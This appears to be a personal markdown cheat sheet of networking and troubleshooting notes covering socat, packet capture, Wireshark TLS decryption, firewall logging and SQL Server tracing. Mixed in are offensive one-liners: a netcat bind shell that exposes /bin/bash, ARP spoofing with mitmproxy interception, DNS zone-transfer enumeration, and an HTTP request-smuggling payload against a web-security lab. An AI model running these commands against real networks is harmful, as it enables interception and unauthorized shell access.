# +

./reverse_shell.sh
./wireshark.md

google: mdn foo

https://www.webpagetest.org/

https://github.com/clowwindy/Awesome-Networking
[The C10K problem - handling ten thousand clients simultaneously](http://www.kegel.com/c10k.html)

http://noahdavids.org/self_published/Tracing_packets_without_collecting_data.html
    > at least "-s 94" for IPv4 or "-s 114" for IPv6

https://docs.microsoft.com/en-us/message-analyzer/filtering-live-trace-session-results

https://serverfault.com/questions/189784/java-fat-client-slow-when-connecting-to-localhost-fast-with-remote
https://hc.apache.org/httpclient-3.x/performance.html

- Ping-scan to discover reachable prefixes
- Traceroute to discover topology
- ZMap on reachable prefixes for common service ports

https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Technical_overview

# relay

```bash
# debug
socat - EXEC:filan,pipes,stderr

# proxy
socat TCP-LISTEN:8080,fork,reuseaddr TCP:google.com:443

# tls tunnel
# alternatives:
# - https://www.stunnel.org/
# - https://github.com/ghostunnel/ghostunnel
socat -v tcp-listen:6667,reuseaddr,fork,bind=127.0.0.1 ssl:"$foo_server":6697
./foo_client -s 127.0.0.1

# http requests
echo "HEAD / HTTP/1.1\r\nHost: google.com\r\nConnection: close\r\n\r\n" | socat -v -x -,ignoreeof openssl:google.com:443,verify=0
echo "HEAD / HTTP/1.1\r\nHost: google.com\r\nConnection: close\r\n\r\n" | socat -v -x -,ignoreeof tcp:google.com:80
# ||
exec 3<>/dev/tcp/www.google.com/80 printf '%s' 'HEAD / HTTP/1.1
Host: http://www.google.com
Connection: close

' >&3 cat <&3

# web server
socat TCP-LISTEN:8080,fork,crnl SYSTEM:'printf \"HTTP/1.1 200 OK\\n\\n\"\; cat test.html'

# chat service - bind to multicast group 239.255.1.1 on interface that has unicast IP 10.0.0.10, sending and receiving on port 4242 over UDP, reading from stdin and writing to stdout.
socat - UDP-DATAGRAM:239.255.1.1:4242,ip-add-membership=239.255.1.1:10.0.0.10,ip-multicast-loop=0,bind=:4242
```

https://repo.or.cz/w/socat.git/blob/HEAD:/EXAMPLES

# connection testing

```ps1
# Reset WINSOCK entries to installation defaults
netsh winsock reset catalog

# Reset TCP/IP stack to installation defaults
netsh int ip reset reset.log

# Reset Firewall to installation defaults
netsh advfirewall reset

# Flush DNS resolver cache
ipconfig /flushdns

# Renew DNS client registration and refresh DHCP leases
ipconfig /registerdns

# Flush routing table (reboot required)
route /f
```

```
pkgmgr /iu:"TelnetClient"
telnet www.example.com 80
```

# security

https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security

# crawling

http://dendritic-trees.tumblr.com/post/157047017934
logging
    web response
python selenium webdriver
proxy server
    ssh -f -N -D 0.0.0.0:<port> localhost
    curl -v -x socks5://<ip>:<port>
headers
user-agent

# frameworks

https://medium.com/javascript-in-plain-english/i-created-the-exact-same-app-in-react-and-vue-here-are-the-differences-e9a1ae8077fd
https://hnpwa.com/
https://github.com/gothinkster/realworld

# Mimicking domain

/etc/hosts

```
127.0.0.1 domain.com
php -S 127.0.0.1:80
```

# Remote debug

```ps1
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=9222
netsh advfirewall firewall add rule name="Open Port 48333" dir=in action=allow protocol=TCP localport=48333
Start-Process "Chrome" "https://www.google.com --headless --remote-debugging-port=9222 --user-data-dir=remote-profile"
# || Without port forwarding
Start-Process "Chrome" "https://www.google.com --headless --remote-debugging-address=0.0.0.0 --remote-debugging-port=9222"
# || Using previous session
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Rollback
netsh interface portproxy reset
netsh advfirewall firewall del rule name="Open Port 48333"
Get-Process chrome | Stop-Process
```

# RESTful API

Client-server model — a client requests data from a separated server, often over a network
Uniform interface — all clients and servers interact with the API in the same way (e.g., multiple resource endpoints)
Layered system — a client doesn't have to be connected to the end server
Statelessness — a client holds the state between requests and responses
Cacheability — a client can cache a server's reponse

# CRUD

HTTP methods:
- POST - Creates a resource
- GET - Reads data for a resource
- PUT - Update a resource's data
- DELETE - Deletes a resource

# GraphQL

./files/graphql.png

data in a graph structure (versus by resources)
one interface (versus multiple endpoints)
type system
    for each node an object type
entrypoints
    query
    mutation

Data exposed to the API is represented by a graph where objects are represented by nodes and relationships between these objects are described by edges
GraphQL is a RESTful API and more: a type system defines all queryable data on one endpoint
There is no mapping between functions implemented on the server and HTTP methods
Each object is backed by a resolver. The resolver is responsible for accessing the server’s data

# MTU

The DHCP client daemon was not applying the MTU setting received from my DHCP server (On my private network I have set the MTU to 9000).

There was a disabled option in /etc/dhcpcd.conf:

```
option interface_mtu
```

I enabled it and it worked.

Now I understand why only the local websites could not be loaded, because the server responded with frames that were too big whereas those from the router never exceeded 1500B because they came from my ISP network.

# private addresses

Private IP addresses are not recognized by Internet routers. 
Packets with either source or destination private addresses are not forwarded across Internet links.

The private IP adresses are the following blocks: 

    Class A 10.0.0.0 - 10.255.255.255 
    Class B 172.16.0.0 - 172.31.255.255 
    Class C 192.168.0.0 - 192.168.255.255 

[RFC 1918 \- Address Allocation for Private Internets](https://tools.ietf.org/html/rfc1918)

# qvalue

Suffix ';q=' immediately followed by a value between 0 and 1 included, with up to three decimal digits, the highest value denoting the highest priority. When not present, the default value is 1.

HTTP headers using q-values in their syntax: Accept, Accept-Charset, Accept-Language, Accept-Encoding, TE.

- https://developer.mozilla.org/en-US/docs/Glossary/Quality_values
- [HTTP/1\.1: Protocol Parameters](https://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.9)
- [HTTP/1\.1: Content Negotiation](https://www.w3.org/Protocols/rfc2616/rfc2616-sec12.html#sec12)
- [RFC 7230 \- Hypertext Transfer Protocol \(HTTP/1\.1\): Message Syntax and Routing](https://tools.ietf.org/html/rfc7230#section-4.3)
- [RFC 7231 \- Hypertext Transfer Protocol \(HTTP/1\.1\): Semantics and Content](https://tools.ietf.org/html/rfc7231#section-5.3.1)
# tcp server

```bash
# listen
nc -lvp 4444 -e /bin/bash
# connect
nc 127.0.0.1 4444
```

# log pid

### firewall

```bash
# Firewall managed ports
iptables -I INPUT -p tcp --dport some_port --jump LOG --log-level DEBUG

# Only new connection attempts
iptables -I INPUT -p tcp --dport some_port -m state --state NEW

# Validation
tail -f /var/log/messages
```

### auditd

```bash
# Enable
auditctl -a exit,always -F arch=b64 -S connect -k MYCONNECT

# Disable
auditctl -d ...

# Validation
ausearch -i
```

https://serverfault.com/questions/352259/finding-short-lived-tcp-connections-owner-process
    https://www.daemon.be/maarten/auditd.html

### ip_conntrack

```bash
modprobe ip_conntrack
cat /proc/net/ip_conntrack
```

### SELinux managed ports

```bash
semanage port -l

# Validation
tail -f /var/log/audit/audit.log
```

### polling

```bash
while true; do
  netstat -an | grep ESTABLISHED
  sleep 0.1
done

cat /proc/net/tcp
# Take `inode`, iterate through pids and fds until found
readlink /proc/$pid/fd/$fd
```

https://superuser.com/questions/34782/with-linux-iptables-is-it-possible-to-log-the-process-command-name-that-initiat

# network bandwidth / throughput

```bash
# server
nc -l -p 12345 | wc -c

# client
dd if=/dev/zero bs=1024K count=512 | nc -q 0 $server_ip 2222

# dd output
# 536870912 bytes (537 MB) copied, 4.87526 s, 117 MB/s

# || tune timing, buffers and protocols
iperf -s
iperf -i 1 -c $server_ip
```

https://iperf.fr/
    https://fasterdata.es.net/performance-testing/network-troubleshooting-tools/iperf/

# network segmentation, private VLANs, intra/inter VLAN ACLs

https://medium.com/@cryps1s/endpoint-isolation-with-the-windows-firewall-462a795f4cfb
IPSEC gives you kerberos authentication out of the gate. Use it. Build AD groups for your tier 0/tier 1 administrators and machines.
Enforce bastion hosts with MFA.
Use ASR for neutering WMI calls. 
Available in GPO and MEM, auditing exists.

# DNS

caching - based on zone reported TTLs
    https://superuser.com/questions/1533833/how-are-dns-records-updated-to-all-dns-servers-in-the-internet

DynDNS
    https://dyn.com/

# sequence diagram

Wireshark > Statistics > Flow Graph
https://github.com/fran-ovia/pcap2puml-py
https://github.com/dgudtsov/pcap2uml
https://sourceforge.net/projects/callflow/

# ARP spoofing

~/code/snippets/arp_spoof.py

```bash
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
arpspoof -i eth0 -t 192.168.10.9 192.168.10.10
# reverse proxy mode
mitmproxy -R https://192.168.10.10
```

# HTTP

SYN and ACK bits sent and received in both directions

tls
1. client hello - cipher suites supported
2. server hello - cipher suite selected
3. server certificate - authentication
    Packet Details > Handshake Protocol: Certificate > Export Packet Bytes...
4. server symmetric keys exchange, e.g. Diffie-Helman - confidentiality for secure stream
    wireshark - filter = ssl, follow = ssl stream
    https://community.cisco.com/t5/security-documents/troubleshoot-tls-using-wireshark/ta-p/3396123
    https://crypto.stackexchange.com/questions/19203/diffie-hellman-and-man-in-the-middle-attacks
on non-standard port
    Packet List > Decode As...

capture setup
    Npcap || Win10Pcap
        https://nmap.org/npcap/vs-winpcap.html
    Wireshark Legacy - skips interface verification
    https://wiki.wireshark.org/CaptureSetup/InterferingSoftware
        Cisco VPN client: may hide all packets, even if not connected - disable the firewall in the Cisco VPN client or stop the "Cisco Systems, Inc. VPN Service"

https://blogs.technet.microsoft.com/nettracer/2010/10/01/how-to-decrypt-an-ssl-or-tls-session-by-using-wireshark
https://blogs.technet.microsoft.com/nettracer/2013/10/12/decrypting-ssltls-sessions-with-wireshark-reloaded/
    Decrypt with private key
        Edit > Preferences > Protocols > SSL > RSA keys list
            IP, Port - from host that holds the private key used to decrypt the data and serves the certificate (i.e. the decrypting host, the server)
            Protocol - upper-layer protocol encrypted by SSL/TLS, e.g. the protocol encrypted over a HTTPS connection is HTTP
            SSL debug file = C:\Temp\ssl_debug.txt
        :( If a Diffie-Hellman Ephemeral (DHE) or RSA ephemeral cipher suite is used, the RSA keys are only used to secure the DH or RSA exchange, not encrypt the data.
            Cipher Suite = TLS_DHE, SSL_DHE
            ServerKeyMessage
        :( Capture must include SSL/TLS session establishment
            Server sends certificate
            SSL debug file = `ssl_restore_session can’t find stored session`
        :( Duplicate packets
            editcap -d
        https://packetpushers.net/using-wireshark-to-decode-ssltls-packets/
        https://www.ibm.com/developerworks/web/tutorials/wa-tomcat/index.html
    Decrypt without private key
        File > Export SSL Session Keys...
    Packet list
        Before = tcp
        After = tcp, http, ssl, tls
    Packet details > Expand: "Hypertext Transfer Protocol", "Line-based text data: text/html"
    Print > Packet Format > Packet details = As displayed

Termination of TCP connection = encrypted alert, SSL_shutdown
    https://osqa-ask.wireshark.org/questions/38050/tlsv1-record-layer-encrypted-alert
    https://www.openssl.org/docs/ssl/SSL_shutdown.html
    https://tools.ietf.org/html/rfc5246#page-29

Certificate Requirements for TLS
    Version = V3
    Enhanced Key Usage = Server Authentication OID
    Subject = Server FQDN
    Subject Alternative Name = Server DNS FQDN
    Public Key = RSA
    Key Usage = "Digital Signature", "Key Encipherment"
    https://documentation.meraki.com/zGeneral_Administration/Other_Topics/Certificate_Requirements_for_TLS
    https://support.microsoft.com/en-my/help/814394/certificate-requirements-when-you-use-eap-tls-or-peap-with-eap-tls

Local network is untrustworthy, cannot confirm it is connected to secure gateway, unknown CA
    http://blog.bstpierre.org/fixing-certificate-errors-with-cisco-anyconnect
    ```bash
    vpn_server=
    openssl s_client -connect www."$vpn_server".com:443 2>&1 | sed -n '/^issuer=/s/.*CN=//p'
    # Given CA name, download input.crt
    # || Use keystore:
    # cp $(dpkg -L ca-certificates | grep -i thawte) /tmp/certificate-conversion/
    # || Copy all global certificates
    # sudo cp /etc/ssl/certs/cd /etc/ssl/cert/* /opt/.cisco/certificates/ca
    openssl x509 -in input.crt -out input.der -outform DER
    openssl x509 -in input.der -inform DER -out output.pem -outform PEM
    cp output.pem ~/.cisco/certificates/ca
    ```

User Authentication against Active Directory, Dissecting EAP-TLS
    SAM Account Name (short name) vs User Principle Name (UPN, includes domain)
    ~/Downloads/BRKSEC-3229.pdf

### HTTP/2

```bash
# Validate server push requests
nghttp -v -ans https://foo/index.html
# || https://github.com/fstab/h2c
# || chrome://net-export
```

# methods

Portmirroring / SPAN, arp poisoning

# DNS Zone Transfer

nmap gateway_ip_or_host
port 53 domain

### linux

```bash
# 1. Take name server
dig NS domain.name

# 2. Discover hostnames
dig -t AXFR @dns-server domain.name
host -t axfr domain.name dns-server
# ||
host -a domain.name
```

### windows

nslookup

> set type=any
> ls -d wayne.net > dns.wayne.net
> ls -t wayne.net > list.wayne.net
> exit

# sqlserver trace

Microsoft Message Analyzer
    https://www.microsoft.com/en-us/download/details.aspx?id=44226

1. New Session
2. New Data Source > Live Trace
3. Scenario > Select:
    If AppFoo and SQL on same system: Loopback and Unencrypted IPsec
    If AppFoo and SQL on separate systems: Local Network Interfaces
4. Start
5. Message Table > Column Header > Add Columns > TDS > SQLBatch > SqlBatchPacketData > Right Click: SQLText > Add as column
    -- https://stackoverflow.com/questions/2023589/how-can-i-decode-sql-server-traffic-with-wireshark

clear log
    restart session

mma
    - `TDS`
    - `*SQLText contains "a"`
    ```
    Fail to start live consumer 
    Please reinstall Message Analyzer to correct the problem. If the PEF-WFP-MessageProvider continues to fail, you may have a conflict with a third party filter driver or your computer might have reached the maximum number of drivers allowed, for example, on a Windows 7 machine. To resolve this issue, you can try increasing the filter driver limit in the registry.
    ```

test
    sqlcmd without `-N` (encrypt connection)

validate TDS packets are sent
    Transact-SQL session > Query menu > Include Client Statistics

https://dragos.com/blog/industry-news/threat-hunting-with-python-part-4-examining-microsoft-sql-based-historian-traffic/
https://www.anitian.com/hacking-microsoft-sql-server-without-a-password/
https://cqureacademy.com/blog/secure-server/tabular-data-stream
https://docs.microsoft.com/en-us/message-analyzer/applying-and-managing-filters

|| dump tables and diff before and after action on app

---

tshark -i lo -d tcp.port==1433,tds -T fields -e tds.query
    https://www.wireshark.org/docs/dfref/t/tds.html

tcpdump -i any -s 0 -l -vvv -w - dst port 3306 | strings
tcpdump -i any -s 0 -l -vvv -w /tmp/1.pcap

The "Microsoft-Windows-NDIS-PacketCapture" provider is used by Message Analyzer, the "netsh trace" command and the "NetEventPacketCapture" PowerShell cmdlets (in particular, the "Add-NetEventPacketCaptureProvider" cmdlet).
-- http://gary-nebbett.blogspot.com/2018/06/gary-gary-2-2132-2018-06-06t153500z.html

Loopback
    On: WMA > Add System Providers
    - Microsoft-Windows-WFP
        = Windows Filtering Provider
    - MSSQLSERVER Trace
    - sqlserver

```
netsh trace start scenario=NetConnection capture=yes report=yes persistent=no maxsize=1024 correlation=no traceFile=C:\Temp\NetTrace.etl
netsh trace stop
```

https://blogs.technet.microsoft.com/yongrhee/2018/05/25/network-tracing-packet-sniffing-built-in-to-windows-server-2008-r2-and-windows-server-2012-2/

# enumerate app servers

```bash
netstat -tulpn | \
    gawk 'match($0, /.*:([0-9]+).*LISTEN/, r){print r[1]}' | \
    xargs -i sh -c '
        printf "HEAD / HTTP/1.0\r\n\r\n" | \
        nc -n -i 2 localhost "$1" | \
        grep "HTTP/[0-9\.]\+\ " && echo "Found server listening at port = $1"\
    ' _ {}
```

# url encoding

```bash
# GET
curl http://foo -G --data-urlencode 'a=foo bar'
# POST
curl http://foo --data-urlencode 'a=foo bar'
```

```python
urllib.unquote(c)
```

# dump

```bash
echo -n "POST / HTTP/1.1\r\nHost: ac281f2f1e11201c8009578100490024.web-security-academy.net\r\nCookie: session=Q5yRgVdBGWyLtH2VIG1pvMTHgvWo82FM\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nA" | openssl s_client -debug -ign_eof -connect ac281f2f1e11201c8009578100490024.web-security-academy.net:443
# With SSL decrypted: Add `-cypher NULL`
# - :( server may reject request
```
